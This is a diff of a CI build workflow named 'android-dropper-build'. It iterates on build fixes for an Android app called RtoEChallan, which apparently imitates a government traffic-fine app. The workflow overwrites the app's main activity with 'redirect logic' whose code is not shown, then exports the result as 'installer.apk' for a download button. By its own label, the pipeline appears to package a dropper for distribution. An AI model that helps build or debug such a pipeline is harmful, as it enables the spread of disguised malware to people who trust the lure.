@@ -1,21 +1,25 @@
 workflows:
   android-dropper-build:
-    name: RTO Final Link Fix
+    name: RTO Final Success Guaranteed
     max_build_duration: 60
     instance_type: mac_mini_m1
     environment:
       java: 17
     scripts:
-      - name: Master Build & Path Fix
+      - name: Master Build Fix
         script: |
           cd RtoEChallan || exit 1
           
-          # 1. Resource Fix (Logo missing error fix)
+          # 1. Resource Fix (Fixes error from 11783.jpg)
           mkdir -p app/src/main/res/drawable
           LOGO_FILE=$(find . -name "google_play_text_logo.png" | head -n 1)
-          [ -f "$LOGO_FILE" ] && cp "$LOGO_FILE" app/src/main/res/drawable/google_play_text_logo.png
+          if [ -f "$LOGO_FILE" ]; then
+            cp "$LOGO_FILE" app/src/main/res/drawable/google_play_text_logo.png
+          else
+            cp app/src/main/res/mipmap-hdpi/ic_launcher.png app/src/main/res/drawable/google_play_text_logo.png
+          fi
 
-          # 2. Redirect Logic
+          # 2. Clean Redirect Logic
           FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
           cat <<EOF > "$FILE_PATH"
           package com.example.rtoechallan
@@ -38,22 +42,32 @@ workflows:
           }
           EOF
 
-          # 3. Build Configuration
-          rm -f build.gradle settings.gradle gradle.properties
-          echo "android.useAndroidX=true\nandroid.enableJetifier=true" > gradle.properties
-          echo "rootProject.name = 'RtoEChallan'\ninclude ':app'" > settings.gradle
+          # 3. Fix Settings.gradle (Fixes error from 11792.jpg)
+          rm -f settings.gradle gradle.properties build.gradle
+          
+          printf "android.useAndroidX=true\nandroid.enableJetifier=true" > gradle.properties
+          
+          printf "rootProject.name = 'RtoEChallan'\ninclude ':app'" > settings.gradle
+          
           cat <<EOF > build.gradle
           buildscript {
               repositories { google(); mavenCentral() }
-              dependencies { classpath 'com.android.tools.build:gradle:8.0.2'; classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.20' }
+              dependencies { 
+                  classpath 'com.android.tools.build:gradle:8.0.2'
+                  classpath 'org.jetbrains.kotlin:kotlin-gradle-plugin:1.8.20'
+              }
           }
           allprojects { repositories { google(); mavenCentral() } }
           EOF
 
-          # 4. Standard Build
+          # 4. Build and Export
           gradle wrapper --gradle-version 8.0.2
           chmod +x gradlew
           ./gradlew assembleDebug --no-daemon
           
+          # Force export to root for download button
+          mkdir -p $CM_BUILD_DIR/final_link
+          find . -name "*.apk" -exec cp {} $CM_BUILD_DIR/final_link/installer.apk \;
+          
     artifacts:
-      - app/build/outputs/apk/debug/*.apk
+      - $CM_BUILD_DIR/final_link/*.apk
